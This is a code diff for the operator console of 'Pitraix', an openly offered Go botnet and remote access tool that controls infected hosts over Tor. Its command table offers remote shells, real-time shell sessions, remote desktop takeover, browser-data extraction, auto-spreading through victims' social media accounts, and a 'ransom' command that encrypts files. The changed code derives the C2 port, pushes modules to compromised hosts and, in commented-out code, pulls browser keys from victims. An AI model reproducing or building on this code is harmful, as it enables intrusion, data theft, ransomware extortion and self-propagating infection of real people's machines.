@@ -53,12 +53,12 @@ import (
 )
 
 const (
-	auto_spread = true // optional snatches browser data and spreads using logged in social media
+	auto_spread = false // optional extracts browser data and spreads using logged in social media. NOTE: this options blows camouflag of operative as agent
 
 	ddosCounter = 25
 	advancedAntiDDos_enabled = false // optional adds protection against targetted ddos, not really needed since v3 address is so long its impossible to bruteforce and ddosers are limited by TOR bandwidth 
-	version = "1.2"
-	debug 	= true
+	version = "1.5"
+	debug 	= false
 )
 
 var (
@@ -83,13 +83,15 @@ var (
 	
 	
 	commands = map[string]string {
+		"isadmin": "Prints whether or not running as admin/root",
+		"show [Type]": "Available types are credits, modules",
 		"rdp [index]": "Control screen, mouse and keyboard, can only control 1 host at time",
 		"shell [command]": "Executes a single shell command on host and waits for output",
 		"shellnoop [command]": "Executes a single shell command on host without waiting for output",
 		"shellrt [command]": "Establishes a real-time shell session for a single host",
 		"ls/list": "Lists all hosts with basic information",
 		"assign [agent index] [host index]": "Assigns a host to an Agent",
-		"snatch [REGS/HSTS/LOGS/EVENTS]": "Snatches information from AG/HST database",
+		"extract [DATA/BROWSER/REGS/HSTS/LOGS/EVENTS]": "Extracts information from AG/HST database",
 		"beep [frequency] [duration]": "Plays beep sound with said settings",
 		"wallpaper [path]": "Sets wallpaper for host",
 		"ransom [Amount] [Crypto Name] [Address]": "Starts a ransom and encrypts files for selected/GLOBAL",
@@ -120,8 +122,17 @@ var (
 
 	upgrader = websocket.Upgrader{} // Websocket support
 
-	onetimeKey string
-	twotimeKey string
+	onetimeKey  string
+	twotimeKey  string
+	operandport string
+
+	antiddosCounter int = 0
+
+	hostRing_FileChn = make(chan t_HSTSingle)
+	// fileChnType      = make(chan int)
+
+	operPrivKey *rsa.PrivateKey
+	
 )
 
 
@@ -197,7 +208,6 @@ type t_HSTSingle struct {
 
 type modules_type struct {
 	Name []string
-	ID   []string
 	Type []string
 	Contents []string
 	
@@ -225,7 +235,6 @@ type module_single_type struct {
 	
 	Execution string
 	Enabled   bool
-	ID		  string
 	Name	  string
 	Candidates []int
 }
@@ -353,79 +362,79 @@ func unzip(src, dest string) error {
 func basic_antiDDOS_check(h *t_HSTSingle) bool {
 	if len(strings.TrimSpace(h.Address)) != 56 {
 		// fmt.Println("address len not 56", len(h.Address))
-		log("basic_antiDDOS_check", "Address length is not 56: " + strconv.Itoa(len(h.Address)))
+		go log("basic_antiDDOS_check", "Address length is not 56: " + strconv.Itoa(len(h.Address)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.IP)) < 6 || len(strings.TrimSpace(h.IP)) > 15 {
 		// fmt.Println("ip len weird", len(h.IP))
-		log("basic_antiDDOS_check", "IP length is weird: " + strconv.Itoa(len(h.IP)))
+		go log("basic_antiDDOS_check", "IP length is weird: " + strconv.Itoa(len(h.IP)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.Country)) != 2 {
 		// fmt.Println("country len not 2", len(h.Country))
-		log("basic_antiDDOS_check", "Country length is not 2: " + strconv.Itoa(len(h.Country)))
+		go log("basic_antiDDOS_check", "Country length is not 2: " + strconv.Itoa(len(h.Country)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.RAM)) > 50 {
 		// fmt.Println("ram len not 9 10 11", len(h.RAM))
-		log("basic_antiDDOS_check", "RAM length is higher than 50: " + strconv.Itoa(len(h.RAM)))
+		go log("basic_antiDDOS_check", "RAM length is higher than 50: " + strconv.Itoa(len(h.RAM)))
 		return false
 	}
 
 	if len(strings.TrimSpace(h.Username)) < 1 || len(strings.TrimSpace(h.Username)) > 256 {
 		// fmt.Println("user len larger than 256", len(h.Username))
-		log("basic_antiDDOS_check", "Username length weird: " + strconv.Itoa(len(h.Username)))
+		go log("basic_antiDDOS_check", "Username length weird: " + strconv.Itoa(len(h.Username)))
 		return false
 	}
 
 	if h.Chassis > 9 || h.Chassis < -1 {
 		// fmt.Println("chassis larger than 9", h.Chassis)
-		log("basic_antiDDOS_check", "Chassis length weird: " + strconv.Itoa(h.Chassis))
+		go log("basic_antiDDOS_check", "Chassis length weird: " + strconv.Itoa(h.Chassis))
 		return false
 	}
 
 	if h.OS > 5 || h.OS < -1 {
-		log("basic_antiDDOS_check", "OS length weird: " + strconv.Itoa(h.OS))
+		go log("basic_antiDDOS_check", "OS length weird: " + strconv.Itoa(h.OS))
 		return false
 	}
 
 	if len(h.OSVar) > 265 || len(h.OSVar) < -1 {
-		log("basic_antiDDOS_check", "OSVar length weird: " + strconv.Itoa(len(h.OSVar)))
+		go log("basic_antiDDOS_check", "OSVar length weird: " + strconv.Itoa(len(h.OSVar)))
 		return false
 	}
 
 	if len(h.Kernel) > 265 || len(h.Kernel) < -1 {
-		log("basic_antiDDOS_check", "Kernel length weird: " + strconv.Itoa(len(h.Kernel)))
+		go log("basic_antiDDOS_check", "Kernel length weird: " + strconv.Itoa(len(h.Kernel)))
 		return false
 	}
 
 	if h.Arch > 5 || h.Arch < -1 {
-		log("basic_antiDDOS_check", "Arch length weird: " + strconv.Itoa(h.Arch))
+		go log("basic_antiDDOS_check", "Arch length weird: " + strconv.Itoa(h.Arch))
 		return false
 	}
 
 	if len(h.Vendor) > 265 || len(h.Vendor) < -1 {
-		log("basic_antiDDOS_check", "Vendor length weird: " + strconv.Itoa(len(h.Vendor)))
+		go log("basic_antiDDOS_check", "Vendor length weird: " + strconv.Itoa(len(h.Vendor)))
 		return false
 	}
 
 	if len(h.Model) > 265 || len(h.Model) < -1 {
-		log("basic_antiDDOS_check", "Model length weird: " + strconv.Itoa(len(h.Model)))
+		go log("basic_antiDDOS_check", "Model length weird: " + strconv.Itoa(len(h.Model)))
 		return false
 	}
 
 	if len(h.ContactD) > 300 || len(h.ContactD) < 5 {
-		log("basic_antiDDOS_check", "ContactD length weird: " + strconv.Itoa(len(h.ContactD)))
+		go log("basic_antiDDOS_check", "ContactD length weird: " + strconv.Itoa(len(h.ContactD)))
 		return false
 	}
 
 
 	_, err := base64.StdEncoding.DecodeString(h.Key)
 	if err != nil {
-		log("basic_antiDDOS_check", "Key base64 error: " + err.Error())
+		go log("basic_antiDDOS_check", "Key base64 error: " + err.Error())
 		return false
 	}
 
@@ -437,7 +446,7 @@ func basic_antiDDOS_check(h *t_HSTSingle) bool {
 
 	_, err = base64.StdEncoding.DecodeString(h.RasKey)
 	if err != nil {
-		log("basic_antiDDOS_check", "RasKey base64 error: " + err.Error())
+		go log("basic_antiDDOS_check", "RasKey base64 error: " + err.Error())
 		return false
 	}
 
@@ -519,14 +528,18 @@ func readFile(filePath string) ([]byte, error){
 
 func running_check(port string) bool {
 	running := true
-		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
+	
+	conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
 	if err != nil {
 		running = false
+		return running
 	}
+	
 	if conn != nil {
 		running = true
 		conn.Close()
 	}
+	
 	return running
 }
 
@@ -870,27 +883,39 @@ func doInstru(addr string, inst, hstAES_Key []byte, direct bool) ([]byte, error)
 	payload_enc_tmp_1 := base64.StdEncoding.EncodeToString(payload_enc)
 	payload_enc_tmp_2 := base64.StdEncoding.EncodeToString(nonce)
 	payload :=  payload_enc_tmp_1 + "|" + payload_enc_tmp_2
+
 	if direct == true || direct == false { // not needed now maybe in future
 		// fmt.Println("payload:", payload)
-		x, err := postRequest("http://" + addr + ".onion", []byte(payload), true, -1)
+		x, err := postRequest("http://" + addr + ".onion", []byte(payload), true, 25) // this should be arg
+
 		if err != nil {
 			return []byte{}, err
+
 		} else {
 			dataSlice := strings.Split(string(x), "|")
+
 			if len(dataSlice) == 2 {
 				temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
 				temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
 				decipher, err := decrypt_AES(temp_decipher, temp_nonce, hstAES_Key)
+
 				if err != nil {
 					return []byte{}, err
+
 				} else {
 					return decipher, nil
+
 				}
+
 			} else {
 				return []byte{}, errors.New("dataSlice len not 2! " + string(x))
+
 			}
+
 		}
+
 	}
+
 	return []byte{}, nil
 } 
 
@@ -1554,7 +1579,7 @@ func (modules *modules_type) loadModules(path string, hrd *t_HST) {
 
 		mod.Name = fname
 
-		mod.ID = hex.EncodeToString(hasher.Sum(nil))
+		// mod.ID = hex.EncodeToString(hasher.Sum(nil))
 
 		var candidates []int
 		for indx, _ := range hrd.Address {
@@ -1647,7 +1672,7 @@ func (modules *modules_type) loadModules(path string, hrd *t_HST) {
 
 		mod.Candidates = candidates
 
-		modules.ID = append(modules.ID, mod.ID)
+		// modules.ID = append(modules.ID, mod.ID)
 		modules.Name = append(modules.Name, mod.Name)
 		modules.Type = append(modules.Type, mod.Type)
 		modules.Contents = append(modules.Contents, mod.Contents)
@@ -1664,6 +1689,24 @@ func (modules *modules_type) loadModules(path string, hrd *t_HST) {
 
 }
 
+func bytesumbig(v []byte) int {
+	sum := 0
+	for i, v := range v {
+		// fmt.Println(sum)
+		sum += int(v) + i * sum
+	}
+	// fmt.Println(sum)
+	return sum
+}
+
+// func randstrint(size) string {
+// 	var s string = ""
+// 	for i := 0; i < size; i++ {
+// 		rdmod.Seed(int64(i + size + len(iv) * sumForSeed))
+// 		s += fmt.Sprintf("%d", rdmod.Intn(9) + 1)
+// 	}
+// }
+
 func main() {
 	if os.PathSeparator == 47 {
 		greenColor  = "\x1b[32m"
@@ -1677,7 +1720,6 @@ func main() {
 	fmt.Printf("%s>%s Loading %sPitraix%s..\n", yellowColor, endColor, redColor, endColor)
 	currentPath, _ := os.Executable()
 
-	agentAddress := setupTor(filepath.Dir(currentPath), "1337", "tor", false)
 
 	hostring_d, all_AGS, err := load_hostring("hostring.json")
 	if err != nil {
@@ -1689,7 +1731,6 @@ func main() {
 		hostring_d, all_AGS, err = load_hostring("hostring.json")
 	}
 
-	var operPrivKey *rsa.PrivateKey
 	operPrivKeyTmp1, err := readFile("OPER_PrivateKey.pitraix")
 	
 	var firstStartup = false
@@ -1724,7 +1765,7 @@ func main() {
 		operPrivKey, err = ParseRsaPrivateKeyPEM(string(operPrivKeyTmp1))
 
 		if err != nil {
-			fmt.Println("Error parsing OPER_PrivateKey:", err)
+			fmt.Println("Critical error parsing OPER_PrivateKey:", err)
 			os.Remove("OPER_PrivateKey")
 			os.Exit(0)
 
@@ -1736,6 +1777,16 @@ func main() {
 	operPubKey := operPrivKey.PublicKey
 
 	operPubKeyPEM, err := ExportRsaPublicKeyAsPEM(&operPubKey)
+	
+	// fmt.Println(operPubKeyPEM)
+	
+	rdmod.Seed(int64(bytesumbig([]byte("LONGLIVEISRAEL"+operPubKeyPEM))))
+	
+	operandport = strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)
+
+	fmt.Println(operandport)
+
+	agentAddress := setupTor(filepath.Dir(currentPath), operandport, "tor", false)
 	
 	if err != nil {
 		fmt.Printf("\n%s>%s There was %serror%s parsing Public-Key this indicates problem with your Private-key. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\nInclude this error: %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
@@ -1753,7 +1804,9 @@ func main() {
 
 		// }
 
-		
+
+
+
 
 
 		for _, v := range []string{"lyst_windows.go", "lyst_windows.exe", "lyst_linux.go", "lyst_linux"} {       
@@ -1811,7 +1864,7 @@ func main() {
 	if debug == false {
 		var noerror = true
 
-		for i := 0; i < 6; i++ {
+		for i := 0; i < 5; i++ {
 			versionCheck, err := getRequest("https://raw.githubusercontent.com/ThrillQuks/Pitraix/main/version.txt", true, -1)
 			if err != nil {
 				noerror = false
@@ -1829,7 +1882,7 @@ func main() {
 		}
 
 		if noerror == false {
-			fmt.Printf("%s>%s There was %serror%s fetching latest version information over %sTOR %s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+			fmt.Printf("%s>%s There was %serror%s fetching latest version information over TOR %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
 		
 		}
 
@@ -1840,7 +1893,7 @@ func main() {
 	
 	fmt.Printf(`%s
 	━━━━━━━┏┓━━━━━━━━━━━━━━━
-	┏━━┓┏┓ ┃┃┏━━┓━┏━┓┏┓┏┓┏┓
+	┏━━┓┏┓ ┃┃ ┏━━┓━┏━┓┏┓┏┓┏┓
 	┃┏┓┃┣┫━┃┃━┗━┓┃━┃┏┛┣┫┗╋╋┛
 	┃┗┛┃┃┃━┃┗┓┃┗┛┗┓┃┃━┃┃┏╋╋┓
 	┃┏━┛┗┛━┗━┛┗━━━┛┗┛━┗┛┗┛┗┛
@@ -1857,110 +1910,118 @@ func main() {
 	
 	fmt.Printf("%s>%s Loaded %sPitraix%s\n\n", blueColor, endColor, greenColor, endColor)
 
-	hostRing_FileChn := make(chan t_HSTSingle)
+	// go func(chn chan t_HSTSingle, typechn chan int, hrd *t_HST) {
 
 	go func(chn chan t_HSTSingle, hrd *t_HST) { // race-safe file write function
+
 		for {
-			newHST, ok := <- chn
-			if ok == false {
-				break
-			}
-			if adv_antiddos_check(newHST.Address, newHST.Key) {
-				hrd.Address  = append(hrd.Address , newHST.Address)
-				hrd.IP       = append(hrd.IP	  , newHST.IP)
-				hrd.Country  = append(hrd.Country , newHST.Country)
-				hrd.City     = append(hrd.City	  , newHST.City)
-				hrd.CPU 	 = append(hrd.CPU	  , newHST.CPU)
-				hrd.RAM 	 = append(hrd.RAM	  , newHST.RAM)
-				hrd.Username = append(hrd.Username, newHST.Username)
-				hrd.Hostname = append(hrd.Hostname, newHST.Hostname)
-				hrd.Chassis  = append(hrd.Chassis , newHST.Chassis)
-				hrd.OS 	 	 = append(hrd.OS	  , newHST.OS)
-				hrd.OSVar 	 = append(hrd.OSVar	  , newHST.OSVar)
-				hrd.Kernel 	 = append(hrd.Kernel  , newHST.Kernel)
-				hrd.MacAddr  = append(hrd.MacAddr , newHST.MacAddr)
-				hrd.Arch 	 = append(hrd.Arch	  , newHST.Arch)
-				hrd.Vendor 	 = append(hrd.Vendor  , newHST.Vendor)
-				hrd.Model 	 = append(hrd.Model	  , newHST.Model)
-				hrd.ContactD = append(hrd.ContactD, newHST.ContactD)
-				hrd.AV		 = append(hrd.AV      , newHST.AV)
+			// dataType, ok := <- typechn
+			// if ok == false {
+			// 	break
+			// }
 
-				hrd.Routes 	 = append(hrd.Routes  , []int{})
+			// if dataType == 0 {
+				newHST, ok := <- chn
+				if ok == false {
+					break
+				}
 
-				hrd.Key 	 = append(hrd.Key   , newHST.Key)
-				hrd.RasKey   = append(hrd.RasKey, newHST.RasKey)
-				
-				jsonDump, err := json.MarshalIndent(hrd, "", " ")
+				if adv_antiddos_check(newHST.Address, newHST.Key) {
+					hrd.Address  = append(hrd.Address , newHST.Address)
+					hrd.IP       = append(hrd.IP	  , newHST.IP)
+					hrd.Country  = append(hrd.Country , newHST.Country)
+					hrd.City     = append(hrd.City	  , newHST.City)
+					hrd.CPU 	 = append(hrd.CPU	  , newHST.CPU)
+					hrd.RAM 	 = append(hrd.RAM	  , newHST.RAM)
+					hrd.Username = append(hrd.Username, newHST.Username)
+					hrd.Hostname = append(hrd.Hostname, newHST.Hostname)
+					hrd.Chassis  = append(hrd.Chassis , newHST.Chassis)
+					hrd.OS 	 	 = append(hrd.OS	  , newHST.OS)
+					hrd.OSVar 	 = append(hrd.OSVar	  , newHST.OSVar)
+					hrd.Kernel 	 = append(hrd.Kernel  , newHST.Kernel)
+					hrd.MacAddr  = append(hrd.MacAddr , newHST.MacAddr)
+					hrd.Arch 	 = append(hrd.Arch	  , newHST.Arch)
+					hrd.Vendor 	 = append(hrd.Vendor  , newHST.Vendor)
+					hrd.Model 	 = append(hrd.Model	  , newHST.Model)
+					hrd.ContactD = append(hrd.ContactD, newHST.ContactD)
+					hrd.AV		 = append(hrd.AV      , newHST.AV)
 
-				if err != nil {
-					fmt.Printf("\n%s>%s There was %serror%s marshalling new host. This could be an attack. %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
-				
-				} else {
-					f, err := os.Create("hostring.json")
+					hrd.Routes 	 = append(hrd.Routes  , []int{})
+
+					hrd.Key 	 = append(hrd.Key   , newHST.Key)
+					hrd.RasKey   = append(hrd.RasKey, newHST.RasKey)
+					
+					jsonDump, err := json.MarshalIndent(hrd, "", " ")
 
 					if err != nil {
-						fmt.Printf("\n%s>%s There was %serror%s creating hostring file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\n", redColor, endColor, redColor, endColor)
-
+						fmt.Printf("\n%s>%s There was %serror%s marshalling new host. This could be an attack. %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+					
 					} else {
-						f.Write(jsonDump)
-						fmt.Printf("\n\n%s>%s New host register! Host count is now %s%d%s\n\n", greenColor, endColor, greenColor, len(hostring_d.Address), endColor)
-						f.Close()
-						
-						// if auto_spread == true {
-						// 	go func(addr string, key string) {
-						// 		fmt.Println("doing browser snatch for", addr, key)
+						f, err := os.Create("hostring.json")
 
-						// 		hstAES_Key, _ := base64.StdEncoding.DecodeString(key)
+						if err != nil {
+							fmt.Printf("\n%s>%s There was %serror%s creating hostring file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\n", redColor, endColor, redColor, endColor)
 
-						// 		insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})
+						} else {
+							f.Write(jsonDump)
+							fmt.Printf("\n\n%s>%s New host register! Host count is now %s%d%s\n\n", greenColor, endColor, greenColor, len(hostring_d.Address), endColor)
+							f.Close()
+							
+							// if auto_spread == true {
+							// 	go func(addr string, key string) {
+							// 		fmt.Println("doing browser extract for", addr, key)
 
-						// 		browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
+							// 		hstAES_Key, _ := base64.StdEncoding.DecodeString(key)
 
-						// 		browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
+							// 		insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})
 
-						// 		if err != nil {
-						// 			fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
+							// 		browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
 
-						// 		} else {
-						// 			fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)
+							// 		browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
 
-						// 			proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")
+							// 		if err != nil {
+							// 			fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
 
-						// 			wsdialer := websocket.Dialer{
-						// 				Proxy: http.ProxyURL(proxyURL),
-						// 			}
+							// 		} else {
+							// 			fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)
 
-						// 			c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
-									
-						// 			if err != nil {
-						// 				fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)
+							// 			proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")
 
-						// 			} else {
-						// 				defer c.Close()
+							// 			wsdialer := websocket.Dialer{
+							// 				Proxy: http.ProxyURL(proxyURL),
+							// 			}
 
-						// 				err := c.WriteMessage(websocket.TextMessage, []byte("don"))
-						// 				if err != nil {
-						// 					fmt.Println("write error:", err)
+							// 			c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
+										
+							// 			if err != nil {
+							// 				fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)
 
-						// 				} else {
-						// 					var bigdick string
-						// 					for {
-						// 						_, message, err := c.ReadMessage()
+							// 			} else {
+							// 				defer c.Close()
 
-						// 						if err != nil {
-						// 							fmt.Println("read error:", err)
-						// 							break
+							// 				err := c.WriteMessage(websocket.TextMessage, []byte("don"))
+							// 				if err != nil {
+							// 					fmt.Println("write error:", err)
 
-						// 						} else {
-						// 							// fmt.Println(message)
+							// 				} else {
+							// 					var bigdick string
+							// 					for {
+							// 						_, message, err := c.ReadMessage()
 
-						// 							if string(message) == "genius" {
-						// 								break
+							// 						if err != nil {
+							// 							fmt.Println("read error:", err)
+							// 							break
 
-						// 							} else {
-						// 								bigdick += string(message) + " "
-														
-						// 							}
+							// 						} else {
+							// 							// fmt.Println(message)
+
+							// 							if string(message) == "genius" {
+							// 								break
+
+							// 							} else {
+							// 								bigdick += string(message) + " "
+															
+							// 							}
 
 						// 						}
 
@@ -2047,9 +2108,15 @@ func main() {
 
 			}
 
+			// } else {
+			// 	fmt.Println("shalom")
+
+			// }
+
 		}
 
 	}(hostRing_FileChn, &hostring_d)
+	// }(hostRing_FileChn, fileChnType, &hostring_d)
 	
 	go func() { // input/output function
 		var (
@@ -2086,9 +2153,11 @@ func main() {
 					} else if operand > 0 && crout == 0 {
 						if operand == 1 || len(selected) == 0 {
 							fmt.Printf("%s%s%s %s>>%s ", greenColor, operand_Modes[operand], endColor, blueColor, endColor)
+						
 						} else {
 							fmt.Printf("%s%s %d%s %s>>%s ", greenColor, operand_Modes[operand], len(selected), endColor, blueColor, endColor)
 						}
+
 					} else {
 						if len(selected) == 0 {
 							fmt.Printf("%s%s%s %s%s >>%s ", greenColor, operand_Modes[operand], endColor, blueColor, crout_Modes[crout], endColor)
@@ -2202,8 +2271,8 @@ func main() {
 							}
 
 							// fmt.Println(matchesCount, len(line_instru_splitted), line_instru_splitted)
-							if matchesCount != len(line_instru_splitted) {
-
+							if matchesCount < len(line_instru_splitted) {
+								// fmt.Println(matchesCount, len(line_instru_splitted))
 								fmt.Printf("%s>%s No matching hosts were found\n", redColor, endColor)
 							}
 							
@@ -2218,7 +2287,7 @@ func main() {
 
 						index, err := strconv.Atoi(line_splitted[1])
 						
-						if err != nil || index > len(hostring_d.Address) {
+						if err != nil || index > len(hostring_d.Address) || 1 > index {
 							fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[1], endColor)
 							continue
 
@@ -2250,11 +2319,20 @@ func main() {
 
 						if avtmp == "" {
 							av = "None"
+						} else {
+							av = avtmp
 						}
 
 						if ostmp == 0 {
 							os = "Linux"
-						}
+						
+						} else if ostmp == 1 {
+							os = "Windows"
+						
+						} else {
+							os = "Else"
+						} 
+
 						if archtmp == 0 {
 							arch = "x86-64"
 
@@ -2341,9 +2419,9 @@ func main() {
 							fmt.Printf("%s>%s This was made completely by %s@MrCypher16%s\n%s>%s Please Donate for more updates, any amount is not small\n\n%sMonero  %s 85HjZpxZngajAEy2123NuXgu1PnNyq2DLSkkr93cyT8QQVae1GruhL4hHAtnaFqeCF7Vo9eW2P11Sig8DDqzVzCSE95NaW6\n%sBitcoin %s bc1q2dqk9u06vv2j5p6yptj9ex7epfv77sxjygnrnw\n\nThanks.\n\n", greenColor, endColor, redColor, endColor, greenColor, endColor, blueColor, endColor, blueColor, endColor)
 
 						} else if strings.HasPrefix(strings.ToLower(line_splitted[1]), "mod") {
-							fmt.Printf("%s>%s Enabled modules count %s%d%s\n\n", blueColor, endColor, blueColor, len(modules.ID), endColor)
-							for indx, id := range modules.ID {
-								fmt.Printf("%s%d >%s Module Name %s%s%s  Module ID %s%s%s\n", blueColor, indx + 1, endColor, blueColor, modules.Name[indx], endColor, blueColor, id, endColor)
+							fmt.Printf("%s>%s Enabled modules count %s%d%s\n\n", blueColor, endColor, blueColor, len(modules.Name), endColor)
+							for indx, name := range modules.Name {
+								fmt.Printf("%s%d >%s Module %s%s%s\n", blueColor, indx + 1, endColor, blueColor, name, endColor)
 							}
 
 						}
@@ -2437,6 +2515,7 @@ func main() {
 
 							} else {
 								fmt.Printf(" %s", str)
+								
 							}
 
 
@@ -2447,6 +2526,7 @@ func main() {
 
 							} else {
 								fmt.Printf(" %s", str)
+								
 							}
 
 							// Hostname
@@ -2456,6 +2536,7 @@ func main() {
 								
 							} else {
 								fmt.Printf(" %s" , str)
+
 							}
 
 							// OS
@@ -2464,17 +2545,23 @@ func main() {
 								os = "Windows"
 								osvar := hostring_d.OSVar[index][27:len(hostring_d.OSVar[index]) - 1]
 								osvarspl := strings.Split(osvar, ".")
+
 								if len(osvar) > 0 {
 									if osvarspl[0] == "6" {
 										osvarspl[0] = "7"
+
 									}
+
 									os = os + " " + osvarspl[0]
+
 								}
+
 							} else if hostring_d.OS[index] == 0 {
 								os = hostring_d.OSVar[index]
 								
 							} else {
 								os = "Unknown"
+
 							}
 
 							str, big = neatierList(os, 14, 12)
@@ -2488,9 +2575,12 @@ func main() {
 							str, big = neatierList(readableContactDate(hostring_d.ContactD[index]), 16, 14)
 							if big == true {
 								fmt.Printf(" %s..", str)
+
 							} else {
 								fmt.Printf("  %s", str)
+								
 							}
+
 							fmt.Print("\n")
 						}
 
@@ -2646,7 +2736,7 @@ func main() {
 						if len(line_splitted) == 2 {
 							index, err := strconv.Atoi(line_splitted[1])
 
-							if err != nil || index > len(hostring_d.Address) {
+							if err != nil || index > len(hostring_d.Address) || 1 > index {
 								fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[1], endColor)
 								continue
 
@@ -2692,15 +2782,15 @@ func main() {
 						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)
 
 					case "pushmods": // this code will be cleaned next release as i continue to remove duplicated code and replacing with fast goroutines
-						for indx, cand := range modules.Candidates {
-							fmt.Println(indx, cand)
+						for indx, _ := range modules.Candidates {
+							// fmt.Println(indx, cand)
 
 							addr := hostring_d.Address[indx]
 
 							fmt.Printf("%s>%s Pushing module %s%s%s to %s%s%s", yellowColor, endColor, blueColor, modules.Name[indx], endColor, blueColor, addr, endColor)
 							hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[indx])
 							
-							insts_marshalled, _ := json.Marshal([]string{fmt.Sprintf("push %s %s %s %s", modules.ID[indx], strings.ToLower(modules.Execution[indx]), modules.Type[indx], modules.Contents[indx])})
+							insts_marshalled, _ := json.Marshal([]string{fmt.Sprintf("push %s %s %s %s", modules.Name[indx], strings.ToLower(modules.Execution[indx]), modules.Type[indx], modules.Contents[indx])})
 
 							out, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
 							if err != nil {
@@ -2718,7 +2808,7 @@ func main() {
 					case "assign":
 						if len(line_splitted) == 3 {
 							firstIndex, err := strconv.Atoi(line_splitted[1])
-							if err != nil || firstIndex > len(hostring_d.Address) {
+							if err != nil || firstIndex > len(hostring_d.Address) || 1 > firstIndex  {
 								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
 								continue
 
@@ -2726,7 +2816,7 @@ func main() {
 
 							secondIndex, err := strconv.Atoi(line_splitted[2])
 
-							if err != nil || secondIndex > len(hostring_d.Address) {
+							if err != nil || secondIndex > len(hostring_d.Address) || 1 > secondIndex {
 								fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[2], endColor)
 								continue
 
@@ -2770,7 +2860,7 @@ func main() {
 
 								} else {
 									f.Write(jsonDump)
-									fmt.Println("Updated hostring file")
+									// fmt.Println("Updated hostring file")
 									f.Close()
 
 								}
@@ -2787,7 +2877,8 @@ func main() {
 					case "rdp":
 						if len(line_splitted) == 2 {
 							index, err := strconv.Atoi(line_splitted[1])
-							if err != nil || index > len(hostring_d.Address) {
+
+							if err != nil || index > len(hostring_d.Address) || 1 > index {
 								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
 								continue
 
@@ -2874,10 +2965,10 @@ func main() {
 
 									go func(indx int, hrd *t_HST) {
 										if os.PathSeparator != 47 {
-											legacy_doInstru("shellnoop", "start msgedge 127.0.0.1:1337/" + onetimeKey + "rdp")
+											legacy_doInstru("shellnoop", "start msgedge 127.0.0.1:" + operandport + "/" + onetimeKey + "rdp")
 
 										} else {
-											legacy_doInstru("shellnoop", "firefox 127.0.0.1:1337/" + onetimeKey + "rdp")
+											legacy_doInstru("shellnoop", "firefox 127.0.0.1:" + operandport + "/" + onetimeKey + "rdp")
 
 										}
 
@@ -2899,42 +2990,64 @@ func main() {
 						}
 
 
+					// case "extracttest":
+					// 	if len(line_splitted) == 3 {
+					// 		if strings.HasPrefix(strings.ToLower(line_instru), "data") {
+					// 			index, err := strconv.Atoi(line_splitted[2])
+					// 			if err != nil || index > len(hostring_d.Address) {
+					// 				fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+					// 				continue
+
+					// 			}
+								
+					// 			addr := hostring_d.Address[index  - 1]
+					// 			key  := hostring_d.Key[index -1]
+					// 			extractBrowsersData(addr, key)
+								
+					// 		} else {
+					// 			fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+
+					// 		}
+
+					// 	} else {
+					// 		fmt.Printf("%s>%s Usage: extract data [index]\n\n", redColor, endColor)
+
+					// 	}
+
 					case "extract":
-						if len(line_splitted) == 3 {
-							if strings.HasPrefix(strings.ToLower(line_instru), "data") {
-								index, err := strconv.Atoi(line_splitted[2])
-								if err != nil || index > len(hostring_d.Address) {
-									fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
-									continue
-
-								}
-								
-								addr := hostring_d.Address[index  - 1]
